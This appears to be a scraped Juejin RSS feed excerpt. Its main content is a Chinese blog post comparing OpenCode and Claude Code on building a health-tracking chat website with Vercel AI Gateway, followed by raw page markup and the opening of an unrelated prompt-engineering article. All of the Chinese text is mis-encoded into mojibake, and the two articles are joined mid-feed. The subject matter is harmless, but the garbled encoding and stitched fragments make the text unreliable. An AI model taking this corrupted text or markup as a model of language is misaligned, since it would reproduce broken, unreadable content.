<pre><code class="hljs language-markdown" lang="markdown">ä½ æ˜¯ä¸€ä½ä¸“ä¸šçš„ç¨‹åºå‘˜ï¼Œè¯·å¸®æˆ‘å¼€å‘ã€Šæ¯æ—¥å¥åº·å°åŠ©æ‰‹ã€‹ç½‘ç«™ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å’Œ AI èŠå¤©æ¥è®°å½•å’Œç®¡ç†æ¯æ—¥å¥åº·çŠ¶æ€ã€‚
â€‹
<span class="hljs-section">## å¼€å‘è¦æ±‚</span>
â€‹
<span class="hljs-bullet">1.</span>Â éœ€è¦åŒ…å«å®Œæ•´çš„å‰ç«¯å’Œåç«¯ï¼Œåç«¯ä½¿ç”¨ Node.js
<span class="hljs-bullet">2.</span>Â ä½¿ç”¨ Vercel çš„ AI Gateway å®ç° AI èƒ½åŠ›ï¼Œéœ€è¦å…ˆé€šè¿‡å®˜æ–¹æ–‡æ¡£æ¥è·å–ç”¨æ³•ï¼šhttps://vercel.com/docs/ai-gateway/getting-started
<span class="hljs-bullet">3.</span>Â ä»¥å®Œæˆæ ¸å¿ƒåŠŸèƒ½ä¸ºç›®æ ‡ï¼Œç¡®ä¿é¡¹ç›®å¯ä»¥æ­£å¸¸è¿è¡Œ
<span class="hljs-bullet">4.</span>Â æ•´ä½“ç½‘ç«™ç•Œé¢é‡‡ç”¨æ¸…æ–°çš„ç»¿è‰²å¥åº·é£æ ¼ï¼Œå“åº”å¼é€‚é…å„ç§å°ºå¯¸çš„è®¾å¤‡
<span class="hljs-bullet">5.</span>Â AI éœ€è¦ä¸»åŠ¨è¯¢é—®ç”¨æˆ·çš„å¥åº·çŠ¶å†µï¼Œæ¯”å¦‚ç¡çœ ã€è¿åŠ¨ã€é¥®é£Ÿç­‰
</code></pre>
<p>ç‚¹å‡»å‘é€åï¼ŒOpenCode ä¼šè‡ªåŠ¨ä½¿ç”¨ç½‘é¡µæŠ“å–å·¥å…·è¯»å– Vercel AI Gateway çš„å®˜æ–¹æ–‡æ¡£ï¼Œå­¦ä¹ æœ€æ–°çš„ç”¨æ³•ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b46a92537c0c4ed59a88adfbfe9681e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=crbxQ1E9b5mjPufgFko5zP8bClk%3D" alt="" loading="lazy"/></p>
<p>å¤§æ¦‚ 5 åˆ†é’Ÿå·¦å³ï¼ŒAI å°±å®Œæˆäº†å…¨éƒ¨ä»£ç çš„ç”Ÿæˆï¼Œå¹¶ä¸”è‡ªåŠ¨å®‰è£…äº†ä¾èµ–ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5edcb0dff2424d0b9e6868d5e5b08c11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=V9CdNVAop8HXpDX32Ux2AiIRrQI%3D" alt="" loading="lazy"/></p>
<p>3ï¼‰æˆ‘ç›´æ¥æŠŠä¹‹å‰æ‹¿åˆ°çš„ Vercel çš„ API Key æä¾›ç»™ AIï¼Œè®©å®ƒå¸®æˆ‘å¯åŠ¨é¡¹ç›®ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/384fdaf7b60e435c806b1fb7bf8431a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=TmSv%2F%2BybvAQp3SbCKGkst9U%2F6bs%3D" alt="" loading="lazy"/></p>
<p>4ï¼‰å¯åŠ¨é¡¹ç›®æˆåŠŸåï¼Œæ‰“å¼€æµè§ˆå™¨è®¿é—® <code>localhost:3000</code>ï¼Œæµ‹è¯•ä¸€ä¸‹æ•ˆæœã€‚</p>
<p>ç»“æœæŠ¥é”™äº†ï¼æ— æ³•è°ƒç”¨ AIã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe85fb0935944a2592d46b7ff64296a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=56KxGAMwooa1RruVF8g1OQVnvtU%3D" alt="" loading="lazy"/></p>
<p>å¯èƒ½æ˜¯ AI å¯¹ Vercel AI Gateway æ–‡æ¡£çš„ç†è§£ä¸åˆ°ä½ï¼Œå¯¼è‡´å†™é”™äº†è°ƒç”¨ AI çš„ä»£ç ã€‚äºæ˜¯æˆ‘å†æ¬¡æŠŠæ–‡æ¡£è¾“å…¥ç»™ AIï¼Œè®©å®ƒå†æˆ˜ä¸€æ¬¡ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d88e2158ccbd44cbbd6ff0ae06ce01be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=VGSquSt0M2%2BEomYbHQXQlFVM0Ek%3D" alt="" loading="lazy"/></p>
<p>ç»“æœåˆæŠ¥é”™äº†ï¼Œæ˜æ˜æˆ‘å·²ç»ç»™ AI æä¾›äº† API Keyï¼Œç³»ç»Ÿè¿˜æ˜¯æŠ¥é”™ â€œç¼ºå°‘ API Keyâ€ã€‚</p>
<p>äºæ˜¯æˆ‘åˆè°ƒäº†ä¸€æ¬¡ AIï¼Œå‘Šè¯‰å®ƒ â€œè¿™ä¸ª key æˆ‘ä¹‹å‰å·²ç»æä¾›ç»™ä½ äº†â€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d8b7fdfb556479090f360bda943f28d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=GmDrDEmhT8kGakNFXPRn2PHtKUU%3D" alt="" loading="lazy"/></p>
<p>ç»è¿‡å¤§æ¦‚ 5 æ¬¡å·¦å³çš„æŠ¥é”™å’Œä¿®å¤ï¼Œä»ç„¶ä¸èƒ½æ­£å¸¸ä½¿ç”¨ï¼æˆ‘éº»äº†å•Šâ€¦â€¦</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62ee1f6c44654d5a9f2225faafdd00f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=bWcCO%2BPEOC3keELQWId3lPcMVNo%3D" alt="" loading="lazy"/></p>
<p>äºæ˜¯ï¼Œæˆ‘æœ‰ä¸€ä¸ªé¬¼ç‚¹å­ï¼šæ—¢ç„¶è¦è·Ÿ Claude Code æ¯”è¾ƒï¼Œé‚£æˆ‘ä¸å¦¨å°è¯•ç”¨ Claude Code ä¿®å¤è¿™ä¸ª OpenCode è§£å†³ä¸äº†çš„é—®é¢˜ï¼Ÿ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0eb1bc559ea949f3a553bddf16400ffb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=zaBumyjVZjpdylsGyPMcOSlO5tE%3D" alt="" loading="lazy"/></p>
<p>è¯•è¯•çœ‹ï¼è¾“å…¥æç¤ºè¯ï¼š</p>
<pre><code class="hljs language-ruby" lang="ruby">ç°åœ¨é¡¹ç›®åç«¯ <span class="hljs-variable constant_">AI</span> åŠŸèƒ½ä¸å¯ç”¨
è¯·å‚è€ƒ <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/vercel.com/docs</span><span class="hljs-regexp">/ai-gateway/getting</span>-started æ–‡æ¡£
å¸®æˆ‘ä¿®å¤åç«¯ï¼Œç¡®ä¿é¡¹ç›®èƒ½æ­£å¸¸è¿è¡Œ
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5aee3ea1b8e4440a9cb7529945493216~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=ZEGs2hdwVDk3Nc2cU4oWEqN00Ds%3D" alt="" loading="lazy"/></p>
<p>Claude Code æˆåŠŸä¿®å¤äº†é—®é¢˜ï¼Œç»ˆäºèƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨äº†ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3ac402eb9cf4153a895defabc6936cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=2TsID2Tmz1KS53W0xBwHUkuVo5g%3D" alt="" loading="lazy"/></p>
<p>ğŸ’¡ æ³¨æ„ï¼Œå¦‚æœä½ é‡åˆ°äº†è°ƒç”¨ AI ç½‘ç»œè¶…æ—¶çš„é—®é¢˜ï¼Œå¯ä»¥è®© AI æŠŠè°ƒç”¨çš„ baseURL æ”¹ä¸º <a href="https://link.juejin.cn?target=https%3A%2F%2Fai-gateway.vercel.sh%2Fv1" target="_blank" title="https://ai-gateway.vercel.sh/v1" ref="nofollow noopener noreferrer">ai-gateway.vercel.sh/v1</a></p>
<p>ä¹‹å‰ç±»ä¼¼çš„ä»»åŠ¡æˆ‘ç”¨ Claude Code / Cursor + GLMï¼Œä¸åˆ° 10 åˆ†é’Ÿå°±æå®šäº†ã€‚è¿™æ¬¡ç«Ÿç„¶èŠ±äº† 20 åˆ†é’Ÿå·¦å³ï¼Œè¿˜è¦ç»è¿‡æ¥å›æ‹‰æ‰¯ï¼Œæ‰èƒ½æ­£å¸¸ä½¿ç”¨ã€‚</p>
<p>è¿™è®©æˆ‘ä¸å¾—ä¸æ€€ç–‘ OpenCode çš„èƒ½åŠ›äº†ã€‚è€Œä¸”æ„Ÿè§‰ GLM å¤§æ¨¡å‹åœ¨ OpenCode ä¸­å¥½åƒå˜ç¬¨äº†ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘çš„é”™è§‰â€¦â€¦</p>
<p>ä¸è¡Œï¼Œå¤§å®¶æŠŠ OpenCode å¹å¾—è¿™ä¹ˆç‰›æ‰¹ï¼Œæˆ‘å¾—å†è¯•è¯•ï¼Œä¸€å®šæ˜¯æˆ‘ç”¨æ³•çš„é—®é¢˜ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41036012512443e78e38446c17632103~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=QwjsoeSLl%2BDzELZby6EMi%2FIjbEU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-12">Ultrawork æ¨¡å¼</h3>
<p>è¿˜è®°å¾—å‰é¢æåˆ°çš„ <code>ultrawork</code>ï¼ˆæˆ– <code>ulw</code>ï¼‰å¼€æŒ‚å’’è¯­ä¹ˆï¼Ÿæèµ·ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a51ea8ccaea4dc4ae968f66b98e61da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=KuGk4BOn269NpN%2FM0rw%2BVVecCMk%3D" alt="" loading="lazy"/></p>
<p>è¿›å…¥æˆ˜æ–—çŠ¶æ€äº†ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f11ab9d865d144e7b201e15da2deed02~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=FMLR32BQdlbuyPb8uvRNY8kzYao%3D" alt="" loading="lazy"/></p>
<p>å¯ä»¥æŸ¥çœ‹å­ä»£ç†è¿è¡Œè¯¦æƒ…ï¼Œå…ˆæŒ‰ <code>Ctrl + x</code> é”®ï¼Œå†æŒ‰æ–¹å‘é”®æ¥æŸ¥çœ‹ä¸åŒçš„ä»£ç†ã€‚</p>
<p>è€Œä¸”å½“åå°ä»»åŠ¡å®Œæˆæ—¶ï¼Œä¼šæœ‰ä¸€ä¸ªæç¤ºã€‚å¯ä»¥çœ‹åˆ° â€œç ”ç©¶ Vercel AI SDK å¯¹è¯æ¨¡å¼â€ çš„ä»»åŠ¡å·²ç»å®Œæˆã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ae235528f6644e3b6032b5adb3b9752~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=VxqRIyaDf55RDaYZXNzdnqy0CA8%3D" alt="" loading="lazy"/></p>
<p>ä¸è¿‡ä½ çŒœæ€ä¹ˆç€ï¼Ÿæˆ‘ç­‰äº†å°†è¿‘ 10 åˆ†é’Ÿï¼Œä»»åŠ¡è¿˜æ²¡ç»“æŸâ€¦â€¦</p>
<p>çœ‹çœ‹è¿™ä¸ªä»»åŠ¡åˆ—è¡¨ï¼Œéœ€è¦è¿™ä¹ˆå¤æ‚å—ï¼Ÿè¿æ•°æ®åº“éƒ½ç»™æˆ‘å¹²å‡ºæ¥äº†ï¼Ÿ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c697047a5e1b42b4a0f1a83f45859926~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=I1pk%2F9KyQ%2BQRXMkwstpWPKCP2%2FY%3D" alt="=" loading="lazy"/></p>
<p>æˆ‘å·²ç»æ²¡è€å¿ƒç­‰ä¸‹å»äº†ï¼Œæ¯ç­å§ï¼</p>
<p>çœ‹æ¥è¿™ç§ä¸ç®—å¤ªå¤æ‚çš„å·¥ä½œå¹¶ä¸èƒ½å‘æŒ¥å‡ºå¤šä»£ç†çš„ä¼˜åŠ¿ã€‚å°±åƒä½ åªæ˜¯è¦æ‰“å°ä¸€å¼ çº¸ï¼Œæ²¡å¿…è¦å‘åŠ¨å…¨å…¬å¸çš„äººï¼Œæœ‰çš„ç ”ç©¶æ‰“å°çš„çº¸å¼ ç±»å‹ã€æœ‰çš„ç ”ç©¶æ‰“å°æœºçš„çŠ¶æ€ã€æœ‰çš„ç ”ç©¶æ€ä¹ˆæ‰“å°å§¿åŠ¿æ›´ä¼˜é›…ã€‚</p>
<h2 data-id="heading-13">æœ€å</h2>
<p>ç»è¿‡ä¸Šè¿°ç®€å•çš„æµ‹è¯•ï¼Œæˆ‘æš‚æ—¶å¯¹ OpenCode ä¿æŒè§‚æœ›çŠ¶æ€ã€‚</p>
<p>å‰ç«¯åšçš„ç¡®å®å¾ˆä¸é”™ï¼Œä½†åç«¯çš„èƒ½åŠ›æ„Ÿè§‰è·Ÿ Claude Code è¿˜æœ‰å·®è·ã€‚</p>
<p>å¦‚æœåªæ˜¯è¿½æ±‚å‰ç«¯ä½¿ç”¨æ–¹ä¾¿ï¼Œé‚£æˆ‘ä¸ºä»€ä¹ˆä¸ç”¨ Cursorï¼Ÿ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b28847ff74340df96731a9a00328a45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=V3oCuUZpSBSVXJBQTIj5E34XY94%3D" alt="" loading="lazy"/></p>
<p>ä¸è¿‡ OpenCode çš„æˆåŠŸè¯´æ˜äº†ä¸€ä¸ªé“ç†ï¼š<strong>è°ç¦»ç”¨æˆ·è¿‘ã€è°èƒ½å‘ç°ç—›ç‚¹ï¼Œè°å°±æœ‰è¶…è¶Šå·¨å¤´çš„æœºä¼šã€‚</strong></p>
<p>Claude Code ç¡®å®å¾ˆå¼ºï¼Œä½†å®ƒå¯¹ä¸­å›½ç”¨æˆ·çš„å°ç¦ï¼Œç»™äº†å¼€æºç¤¾åŒºä¸€ä¸ªç»ä½³çš„æœºä¼šã€‚OpenCode æŠ“ä½äº†è¿™ä¸ªç—›ç‚¹ï¼Œç”¨æ›´å¼€æ”¾çš„æ–¹å¼èµ¢å¾—äº†ç”¨æˆ·çš„å¿ƒã€‚</p>
<p>è™½ç„¶æ•ˆæœæœ‰å¾…æé«˜ï¼Œä½†æ¯•ç«Ÿ OpenCode å®Œå…¨å¼€æºå…è´¹ï¼Œå¯¹äºå–œæ¬¢æŠ˜è…¾çš„ç¨‹åºå‘˜æ¥è¯´ï¼Œå¯å®šåˆ¶æ€§æ›´å¼ºã€‚ä½ ç”šè‡³å¯ä»¥ fork ä¸€ä»½è‡ªå·±é­”æ”¹ï¼Œæƒ³æ€ä¹ˆç©å°±æ€ä¹ˆç©ã€‚</p>
<p>OKï¼Œå°±èŠåˆ°è¿™é‡Œã€‚ä½ ç”¨è¿‡ OpenCode å—ï¼Ÿæ¬¢è¿è¯„è®ºåŒºèŠèŠä½ çš„ä½“éªŒ~</p>
<h2 data-id="heading-14">æ›´å¤š</h2>
<p>ğŸ’» ç¼–ç¨‹å­¦ä¹ äº¤æµï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Fcode-nav" target="_blank" title="https://github.com/liyupi/code-nav" ref="nofollow noopener noreferrer">ç¼–ç¨‹å¯¼èˆª</a> ğŸ“ƒ ç®€å†å¿«é€Ÿåˆ¶ä½œï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Flaoyujianli" target="_blank" title="https://github.com/liyupi/laoyujianli" ref="nofollow noopener noreferrer">è€é±¼ç®€å†</a> âœï¸ é¢è¯•åˆ·é¢˜ç¥å™¨ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Fmianshiya" target="_blank" title="https://github.com/liyupi/mianshiya" ref="nofollow noopener noreferrer">é¢è¯•é¸­</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI ä½¿ç”¨ç»éªŒåˆ†äº«ï¼šä»æ··æ²Œåˆ°ç§©åºçš„æç¤ºè¯å·¥ç¨‹]]></title>    <link>https://juejin.cn/post/7592884480732069934</link>    <guid>https://juejin.cn/post/7592884480732069934</guid>    <pubDate>2026-01-09T02:44:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592884480732069934" data-draft-id="7592803747472146482" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI ä½¿ç”¨ç»éªŒåˆ†äº«ï¼šä»æ··æ²Œåˆ°ç§©åºçš„æç¤ºè¯å·¥ç¨‹"/> <meta itemprop="keywords" content="AIGC,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-09T02:44:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="KaneLogger"/> <meta itemprop="url" content="https://juejin.cn/user/3650034333917031"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI ä½¿ç”¨ç»éªŒåˆ†äº«ï¼šä»æ··æ²Œåˆ°ç§©åºçš„æç¤ºè¯å·¥ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3650034333917031/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    KaneLogger
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T02:44:51.000Z" title="Fri Jan 09 2026 02:44:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3de00d1e79e846a6ae4cca70bea97abe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531490&amp;x-signature=k%2F%2BBz%2BUZ6jRcBV%2FVdDdvxcKZuoc%3D" alt="Taming_AI_Through_Structure-å›¾ç‰‡-0.jpg" loading="lazy"/>
ç°åœ¨çš„ AI æ˜¯é«˜èƒ½åŠ›ä½†é«˜ç†µçš„é»‘ç®±ç³»ç»Ÿã€‚ä½ ç»™å®ƒæ¨¡ç³Šçš„è¾“å…¥(é«˜ç†µ),å®ƒå°±è¿”å›æ··æ²Œçš„è¾“å‡º(ä½ä»·å€¼)ã€‚è¿™ä¸æ˜¯ AI çš„é—®é¢˜,æ˜¯çƒ­åŠ›å­¦ç¬¬äºŒå®šå¾‹åœ¨ä¿¡æ¯ç³»ç»Ÿä¸­çš„ä½“ç°ã€‚è§£å†³æ–¹æ¡ˆåªæœ‰ä¸€ä¸ª:é™ä½è¾“å…¥ç†µã€‚</p>
<p>ç”¨ç»“æ„åŒ–çš„æç¤ºè¯æŠŠç³»ç»Ÿä»"å¸ƒæœ—è¿åŠ¨"è¸¢è¿›"æ¿€å‘æ€"ã€‚
æ¢å¥è¯è¯´å°±æ˜¯æŠŠä½ çš„éœ€æ±‚å†™å¾—åƒç¨‹åºæ¥å£ã€åƒåˆåŒæ¡æ¬¾ã€åƒ SOP æ“ä½œæ‰‹å†Œã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/44ee4f4637ec4a2a8433d0a43e2e4e09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531490&amp;x-signature=vOu6G8Is9gSIGm1dFxao%2Bua6uoE%3D" alt="Taming_AI_Through_Structure-å›¾ç‰‡-1.jpg" loading="lazy"/></p>
<h2 data-id="heading-0">ä»»åŠ¡è¯Šæ–­å†³ç­–æ ‘</h2>
